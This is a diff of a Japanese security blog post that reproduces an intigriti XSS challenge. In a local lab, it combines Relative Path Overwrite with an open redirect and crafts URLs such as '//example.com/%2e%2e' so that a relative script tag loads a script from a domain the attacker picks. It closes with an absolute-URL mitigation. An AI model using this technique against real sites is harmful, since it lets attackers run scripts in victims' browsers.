@@ -1,45 +1,35 @@
 +++
 title = "RPOとOpenRedirectを用いたXSS"
-date = "2021-07-21"
+date = "2021-07-20"
 tags = [
     "security",
 ]
-draft = true
 +++
 
-## RPOとは
-
-Gereth heysが提唱
-
-PRSSIとも呼ばれており、当初はCSSのみに焦点を当てた脆弱性でした
-
-以下の記事で詳細を確認できます。
-
-(TODO あの人が書いた記事のリンクを貼る)
-
-## RPOとOpenRedirectを組み合わせたXSS
+RPOとは、Gareth Heyesが提唱した脆弱性です。(http://www.thespanner.co.uk/2014/03/21/rpo/)
 
 この脆弱性の理解のため、今回はintigritiのXSS Challengeで出題された問題の再現を行います。
-
 この問題の詳細は以下の動画で確認できます。
 
-TOOD youtube URL
+<iframe width="560" height="315" src="https://www.youtube.com/embed/0-sA_kAVw74" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
+<br>
+<br>
 
 上記の動画では、`http://vulnerable-server//example.com/..`にアクセスを行い、相対パスで読み込んでいるリソースの起点を`http://vulnerable-server//example.com`とすることで、任意のスクリプトの実行を行なっています。
 
-`http://vulnerable-server//example.com/..`へのアクセスは正規化されたパスのコンテンツが返されるサーバーの仕様により、`http://vulnerable-server/`にアクセスした時と同じコンテンツが返却されます。
+`http://vulnerable-server//example.com/..`へのアクセスは、サーバーの仕様により`http://vulnerable-server/`にアクセスした時と同じコンテンツが返却されます。
 
 `http://vulnerable-server/`では、以下の様に相対パスでのスクリプトの読み込みを行なっているため、`http://vulnerable-server//example.com/script.js`からスクリプトが読み込まれます。
 
 ```html
-<script src=script.js> </script> <!-- => http://vulnerable-server//example.com/script.js-->
+<script src=script.js> </script> <!-- http://vulnerable-server//example.com/script.js-->
 ```
 
 `http://vulnerable-server//example.com/script.js`へのアクセスは、リダイレクトの機能が動作するため、実際には`http://example.com/script.js`から読み込まれます。
 
 攻撃者は`example.com`の部分を好きなドメインに書き換えてアクセスすることで、好きなドメインからスクリプトを読み込むことが可能になります。
 
-## 実装してみる
+#### 実装してみる
 
 今回実装する脆弱なWebサーバーは、以下の機能を有しています。
 - `//<ホスト名>`というようなアクセスでリダイレクトが可能
@@ -103,9 +93,9 @@ func main() {
 }
 ```
 
-GitHubのリンクはこちらです。 (TODO GitHubリンク)
+GitHubのリンクはこちらです。(https://github.com/mute1997/relative-path-overwrite)
 
-## 再現
+#### 再現
 
 実装したサーバーを用いて、XSSを再現させます。
 
@@ -113,16 +103,20 @@ GitHubのリンクはこちらです。 (TODO GitHubリンク)
 
 以下のスクリーンショットの様に、Chromeでは`http://localhost:8000//example.com/..`にアクセスした場合、ブラウザによって`http://localhost:8000`へのアクセスへ勝手に変更されてしまいます。
 
-TODO スクリーンショット
+<img src=chrome.png>
+<br>
 
 この挙動は、FireFoxはSafariでも同様です。
-
 これでは、相対パスの起点を`http://localhost:8000//example.com`にすることが出来ません。
 
-しかし、FireFoxでは`http://localhost:8000//example.com/%2e.`と言う様なアクセスを行うことで、ブラウザの正規化を回避してアクセスが可能になります。
+しかし、FireFoxでは`http://localhost:8000//example.com/%2e%2e`と言う様なアクセスを行うことで、ブラウザの正規化を回避してアクセスが可能になります。
 
-FireFoxで`http://localhost:8000//example.com/%2e.`にアクセスすることで、以下の様に`http://example.com/script.js`からファイルを読み込んでおり、攻撃が成功したことがわかります。
+FireFoxで`http://localhost:8000//example.com/%2e%2e`にアクセスすることで、以下の様に`http://example.com/script.js`からファイルを読み込んでおり、攻撃が成功したことがわかります。
 
-## まとめ
+<img src=firefox.png>
+<br>
 
-今回の例では、非常に限定的
+#### まとめ
+
+今回の例では、非常に限定的ではありますが、RPOとOpenRedirectを用いてXSSが可能であることを確認できました。
+相対パスの読み込みを絶対パスに修正するだけで回避可能な脆弱性なため、リソースの読み込みは必要が無ければ絶対URLで行うのが良さそうです。
